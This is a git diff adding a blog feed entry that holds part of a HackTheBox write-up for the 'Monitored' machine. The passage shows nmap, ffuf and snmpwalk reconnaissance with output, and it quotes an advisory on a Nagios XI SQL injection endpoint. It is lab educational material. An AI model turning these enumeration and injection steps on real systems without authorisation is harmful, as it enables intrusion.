@@ -12,6 +12,566 @@
     </author>
     
       <item>
+        <title>Monitored - HackTheBox</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;In today’s post, we will be solving Season’s 4 second machine, Monitored. This is a medium difficulty machine full of rabbit
+holes, so we need to pay attention to its environment in order to solve it. Let’s jump right into it!&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Reconnaissance&lt;/li&gt;
+  &lt;li&gt;Getting foothold&lt;/li&gt;
+  &lt;li&gt;System enumeration&lt;/li&gt;
+  &lt;li&gt;Privilege escalation&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;
+
+&lt;p&gt;We start by enumerating the system’s ports in order to get a feeling of what is running:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap 10.129.37.231
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.37.231
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65530 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp   open  http       Apache httpd 2.4.56
+|_http-server-header: Apache/2.4.56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Did not follow redirect to https://nagios.monitored.htb/
+389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
+443/tcp  open  ssl/http   Apache httpd 2.4.56 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nagios.monitored.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Monitored/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Dorset/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UK
+| Not valid before: 2023-11-11T21:46:55
+|_Not valid after:  2297-08-25T21:46:55
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
+|_http-title: Nagios XI
+5667/tcp open  tcpwrapped
+No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+TCP/IP fingerprint:
+OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1/15%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;22%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30330%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;65A56AA
+OS:8%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;102%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;108%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ
+OS:&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;102%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;108%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;O1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11
+OS:NW7%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CNNT11NW7%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE8
+OS:8%W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FAF0%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53
+OS:CNNSNW7%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+OS:R&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F
+OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T
+OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RI
+OS:D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Network Distance: 2 hops
+Service Info: Host: nagios.monitored.htb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 80/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+HOP RTT       ADDRESS
+1   131.38 ms 10.10.14.1
+2   131.45 ms 10.129.37.231
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Jan 15 17:26:00 2024 -- 1 IP address (1 host up) scanned in 115.23 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this, we find a bunch of services, but none of them are very interesting besides the web page. To access the web service,
+we need to add the line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; nagios.monitored.htb&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. After that, we can access it with our browser:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored1.png&quot; alt=&quot;landing page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we click on “Access Nagios”, we will be brought to a login page, at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/login.php&lt;/code&gt;. I’ve tried to brute-force it and
+send send SQL injection payloads, but that did not work. We know that this service is called Nagios XI, so my next step was to
+look for common vulnerabilities revolving around this service. Upon a quick search, we find &lt;a href=&quot;https://outpost24.com/blog/nagios-xi-vulnerabilities/&quot;&gt;this&lt;/a&gt; blog about Nagios XI CVEs. One that stands out to me is the first one, CVE-2023-40931. It reads:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.&lt;/p&gt;
+
+  &lt;p&gt;When a user acknowledges a banner, a POST request is sent to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/admin/banner_message-ajaxhelper.php&lt;/code&gt; with the POST data consisting of the intended action and message ID – &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action=acknowledge banner message&amp;amp;id=3&lt;/code&gt;.&lt;/p&gt;
+
+  &lt;p&gt;The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xi_session&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xi_users&lt;/code&gt; table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As we can see, this vulnerability seems plausible, but we need a way in, since it only works if we have at least
+access to a low privileged user.&lt;/p&gt;
+
+&lt;p&gt;I’ve ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf -u http://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt&lt;/code&gt; to enumerate endpoints and this is what I’ve got:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;                    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 139ms]
+mobile                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 136ms]
+images                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 137ms]
+about                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 135ms]
+admin                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 129ms]
+reports                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
+includes                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 130ms]
+sounds                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 134ms]
+account                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
+tools                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 132ms]
+backend                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
+config                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 134ms]
+views                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 136ms]
+db                      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 137ms]
+api                     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 134ms]
+terminal                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 204ms]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The only interesting endpoint is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terminal&lt;/code&gt;, which seems to be a terminal access to the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored2.png&quot; alt=&quot;terminal endpoint&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, this is not useful unless we have credentials to login.&lt;/p&gt;
+
+&lt;p&gt;We also see that there is an API endpoint, which might contain information disclosure or other ways in. However, after enumerating it, all I got was 403 status codes. Ok, let’s step back a little. We have found some interesting vectors, but we might need to 
+find the credentials ourselves within the recon. According to Nagios XI documentation, it seems to be a network monitoring system. 
+With a bit of research, we find &lt;a href=&quot;https://www.nagios.com/solutions/snmp-monitoring/&quot;&gt;this&lt;/a&gt; page stating that Nagios XI provides complete monitoring of SNMP (Simple Network Message Protocol). SNMP runs on UDP port 161/162, and that was not shown on our first 
+Nmap scan. This is because we have not specified it to perform a UDP scan. Let’s re-run Nmap with that in mind now:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; udp.nmap 10.129.37.231
+Warning: 10.129.37.231 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nagios.monitored.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.37.231&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 984 closed udp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;port-unreach&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT      STATE         SERVICE
+68/udp    open|filtered dhcpc
+123/udp   open          ntp
+161/udp   open          snmp
+162/udp   open|filtered snmptrap
+3702/udp  open|filtered ws-discovery
+16697/udp open|filtered unknown
+16838/udp open|filtered unknown
+17836/udp open|filtered unknown
+21167/udp open|filtered unknown
+34038/udp open|filtered unknown
+37843/udp open|filtered unknown
+40622/udp open|filtered unknown
+41524/udp open|filtered unknown
+43967/udp open|filtered unknown
+54281/udp open|filtered unknown
+65024/udp open|filtered unknown
+
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Jan 15 18:09:22 2024 -- 1 IP address (1 host up) scanned in 1065.19 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, SNMP service is running on port 161. We can refer to &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp&quot;&gt;this&lt;/a&gt; HackTricks page about SNMP enumeration, which provides a good insight on how to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt;. This is what we can
+run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.129.37.231 system | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;snmpwalk.txt
+SNMPv2-MIB::sysDescr.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Linux monitored 5.10.0-27-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 5.10.205-2 (2023-12-31) x86_64&lt;/span&gt;
+SNMPv2-MIB::sysObjectID.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+DISMAN-EVENT-MIB::sysUpTimeInstance &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;313660&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:52:16.60
+SNMPv2-MIB::sysContact.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Me &amp;lt;root@monitored.htb&amp;gt;
+SNMPv2-MIB::sysName.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: monitored
+SNMPv2-MIB::sysLocation.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Sitting on the Dock of the Bay
+SNMPv2-MIB::sysServices.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: 72
+SNMPv2-MIB::sysORLastChange.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1581&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:15.81
+SNMPv2-MIB::sysORID.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
+SNMPv2-MIB::sysORID.2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-MPD-MIB::snmpMPDCompliance
+SNMPv2-MIB::sysORID.3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
+SNMPv2-MIB::sysORID.4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMPv2-MIB::snmpMIB
+SNMPv2-MIB::sysORID.5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
+SNMPv2-MIB::sysORID.6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: TCP-MIB::tcpMIB
+SNMPv2-MIB::sysORID.7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: UDP-MIB::udpMIB
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The output is huge and contains lots of information. After it finishes, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snmpwalk.txt&lt;/code&gt; file to see
+if we can find anything useful at all:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;password
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;username
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;user
+HOST-RESOURCES-MIB::hrSWRunParameters.840 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;&lt;/span&gt;
